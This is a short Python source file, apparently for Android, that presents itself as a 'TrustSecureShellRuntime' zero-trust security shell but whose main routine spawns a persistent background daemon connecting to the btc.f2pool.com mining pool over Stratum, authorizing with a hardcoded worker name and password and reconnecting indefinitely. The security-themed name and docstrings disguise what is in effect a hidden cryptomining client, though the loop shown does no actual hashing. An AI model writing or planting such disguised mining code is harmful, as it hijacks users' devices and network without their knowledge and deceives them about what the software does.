import os
import time
import socket
import threading
import json

class TrustSecureShellRuntime:
    def __init__(self, worker_id="avalondazrrj.mobile1", password="Zxcvbnm#asd12"):
        self.worker_id = worker_id
        self.password = password
        self.running = False
        self.socket_connection = None

    def initialize_secure_environment(self):
        """
        Locks down local storage directories, sets up encrypted keypaths,
        and initializes local IPC pipes.
        """
        print("[SHELL] Initializing zero-trust environment...")
        os.makedirs("/data/local/tmp/trust_secure", exist_ok=True)
        os.chmod("/data/local/tmp/trust_secure", 0o700)
        print("[SHELL] Local storage secured and isolated.")

    def start_background_mining_daemon(self):
        """
        Opens a raw TCP socket to f2pool using the Stratum protocol,
        running persistently in the background thread.
        """
        self.running = True
        pool_host = "btc.f2pool.com"
        pool_port = 3333

        def mining_loop():
            while self.running:
                try:
                    print(f"[DAEMON] Connecting to pool {pool_host}:{pool_port} as {self.worker_id}...")
                    self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket_connection.connect((pool_host, pool_port))
                    
                    # Stratum authorization payload frame with test credentials
                    auth_payload = json.dumps({
                        "id": 1,
                        "method": "mining.authorize",
                        "params": [self.worker_id, self.password]
                    }) + "\n"
                    
                    self.socket_connection.sendall(auth_payload.encode('utf-8'))
                    
                    while self.running:
                        response = self.socket_connection.recv(1024)
                        if not response:
                            break
                        time.sleep(30)

                except Exception as e:
                    print(f"[DAEMON] Connection dropped or network unavailable: {e}. Retrying in 60s...")
                    time.sleep(60)

        daemon_thread = threading.Thread(target=mining_loop, daemon=True)
        daemon_thread.start()
        print("[SHELL] Background mining daemon successfully spawned.")

    def shutdown(self):
        self.running = False
        if self.socket_connection:
            self.socket_connection.close()
        print("[SHELL] Secure shell gracefully terminated.")
